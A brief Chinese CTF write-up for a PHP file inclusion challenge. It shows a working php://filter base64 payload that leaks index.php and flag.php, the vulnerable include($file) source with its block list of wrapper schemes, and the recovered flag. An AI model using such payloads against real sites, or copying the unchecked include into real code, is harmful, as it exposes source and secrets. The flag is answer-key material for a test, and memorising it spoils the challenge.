## easy_file_include

- 查资料：https://www.jianshu.com/p/6af8e76d22a5<-拿这个payload试了下可以用

  > payload:http://106.15.207.47:21002/?file=php://filter/read=convert.base64-encode/resource=./index.php

  得到源码：

  ```php
  <meta charset="utf8">
  <?php
  error_reporting(0);
  $file = $_GET["file"];
  if(stristr($file,"php://input") || stristr($file,"zip://") || stristr($file,"phar://") || stristr($file,"data:")){
  	exit('hacker!');
  }
  if($file){
  	include($file);
  }else{
  	echo '<a href="?file=flag.php">tips</a>';
  }
  ?>
  ```

  好像并没有什么用，直接读`flag.php`发现flag就在注释里...

  > payload:http://106.15.207.47:21002/?file=php://filter/read=convert.base64-encode/resource=./flag.php

  ```php
  <?php
  echo "Can you find out the flag?";
  //ACTF{Fi1e_InClUdE_Is_EaSy}
  ```